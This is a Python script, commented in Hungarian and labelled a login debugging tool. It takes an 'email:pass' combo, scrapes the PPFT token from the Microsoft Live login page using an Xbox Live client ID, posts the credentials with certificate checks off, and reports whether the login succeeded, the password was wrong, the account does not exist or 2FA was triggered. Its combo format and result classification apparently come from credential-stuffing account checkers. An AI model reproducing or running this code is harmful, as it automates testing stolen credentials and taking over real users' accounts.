"""
DEBUG SCRIPT - Megmutatja pontosan hol akad el a login.
Futtasd: python debug_login.py
Add meg az email:pass-t amikor kéri.
"""
import re
import requests
import urllib3
from urllib.parse import urlparse, parse_qs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sFTTag_url = (
    'https://login.live.com/oauth20_authorize.srf?'
    'client_id=00000000402B5328&'
    'redirect_uri=https://login.live.com/oauth20_desktop.srf&'
    'scope=service::user.auth.xboxlive.com::MBI_SSL&'
    'display=touch&response_type=token&locale=en'
)

combo = input("Email:Pass > ").strip()
if ':' not in combo:
    print("Nincs ':' a combóban!")
    exit()
email, password = combo.split(':', 1)

session = requests.Session()

print("\n[1] Oldal lekérése...")
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}

try:
    r = session.get(sFTTag_url, headers=headers, timeout=15, verify=False)
    print(f"  Status: {r.status_code}")
    print(f"  Final URL: {r.url}")
    text = r.text
    print(f"  HTML méret: {len(text)} karakter")
except Exception as e:
    print(f"  HIBA: {e}")
    exit()

print("\n[2] PPFT token keresése...")

# LEGFONTOSABB: JS $Config "sFT" kulcs
m_sft = re.search(r'"sFT":"([^"]+)"', text)
# Pattern 1: name="PPFT" előbb van mint value
m1 = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text, re.S)
# Pattern 2: value előbb van
m2 = re.search(r'value="([^"]+)"[^>]*name="PPFT"', text, re.S)
# Pattern 3: sFTTag JS változó
m3 = re.search(r"sFTTag:'(.+?)'", text, re.S) or re.search(r'sFTTag:"(.+?)"', text, re.S)
# Pattern 4: régi escaped
m4 = re.search(r'value=\\\\"(.+?)\\\\"', text, re.S)
# Pattern 5: általános PPFT keresés
m5 = re.search(r'name=["\']PPFT["\']', text)

print(f"  [UJ] JS $Config 'sFT' pattern: {'TALALT: ' + m_sft.group(1)[:30] + '...' if m_sft else 'NEM TALALT'}")
print(f"  name='PPFT' value='...' pattern: {'TALALT: ' + m1.group(1)[:20] + '...' if m1 else 'NEM TALALT'}")
print(f"  value='...' name='PPFT' pattern: {'TALALT: ' + m2.group(1)[:20] + '...' if m2 else 'NEM TALALT'}")
print(f"  sFTTag JS pattern: {'TALALT: ' + m3.group(1)[:30] + '...' if m3 else 'NEM TALALT'}")
print(f"  Escaped pattern: {'TALALT' if m4 else 'NEM TALALT'}")
print(f"  PPFT name attr jelenlete: {'IGEN' if m5 else 'NEM'}")

# urlPost
mu = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
print(f"\n  urlPost: {'TALÁLT: ' + mu.group(1)[:60] + '...' if mu else 'NEM TALÁLT'}")

# Ha semmit nem találtunk, mutassuk a HTML-t
if not (m1 or m2 or m3 or m4):
    print("\n  [!] PPFT nem található! HTML részlet (első 3000 karakter):")
    print(text[:3000])
    input("\nNyomj Entert a kilépéshez...")
    exit()

sFTTag = (m1 or m2).group(1) if (m1 or m2) else None
if not sFTTag and m3:
    inner = m3.group(1)
    vm = re.search(r'value="([^"]+)"', inner)
    sFTTag = vm.group(1) if vm else None

urlPost = mu.group(1).replace('&amp;', '&') if mu else None

print(f"\n  sFTTag: {sFTTag[:30]}..." if sFTTag else "\n  sFTTag: NINCS!")
print(f"  urlPost: {urlPost[:60]}..." if urlPost else "  urlPost: NINCS!")

if not sFTTag or not urlPost:
    print("\n[!] PPFT vagy urlPost hiányzik - ez okozza a hibát!")
    input("Nyomj Entert a kilépéshez...")
    exit()

print("\n[3] Bejelentkezési kísérlet...")
data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
post_headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'close',
    'Origin': 'https://login.live.com',
    'Referer': sFTTag_url
}

try:
    lr = session.post(urlPost, data=data, headers=post_headers, allow_redirects=True, timeout=15, verify=False)
    final_url = lr.url
    resp_text = lr.text
    
    print(f"  Status: {lr.status_code}")
    print(f"  Final URL: {final_url}")
    print(f"  'access_token' az URL-ben: {'IGEN' if 'access_token' in final_url else 'NEM'}")
    print(f"  '#' az URL-ben: {'IGEN' if '#' in final_url else 'NEM'}")
    print(f"  'oauth20_desktop.srf' az URL-ben: {'IGEN' if 'oauth20_desktop.srf' in final_url else 'NEM'}")
    print(f"  'cancel?mkt' a válaszban: {'IGEN' if 'cancel?mkt=' in resp_text else 'NEM'}")
    print(f"  '2FA/confirm' jelek: {'IGEN' if any(v in resp_text for v in ['recover?mkt','Email/Confirm','proofs.live.com']) else 'NEM'}")
    print(f"  'password is incorrect' a válaszban: {'IGEN' if 'password is incorrect' in resp_text.lower() else 'NEM'}")
    acc_not_exist = "account doesn't exist" in resp_text.lower()
    print(f"  'account doesn't exist' a valaszban: {'IGEN' if acc_not_exist else 'NEM'}")
    
    if 'access_token' in final_url:
        token = parse_qs(urlparse(final_url).fragment).get('access_token', [None])[0]
        print(f"\n  >>> SIKERES LOGIN! Token: {token[:30]}..." if token else "\n  >>> URL-ben access_token de parse nem sikerült")
    elif 'oauth20_desktop.srf' in final_url:
        print(f"\n  >>> SIKERES REDIRECT oauth20_desktop.srf-re (nincs token a fragmentben)")
    else:
        print(f"\n  >>> NEM SIKERÜLT - Válasz HTML részlet:")
        print(resp_text[:2000])

except Exception as e:
    print(f"  LOGIN HIBA: {e}")

input("\nNyomj Entert a kilépéshez...")
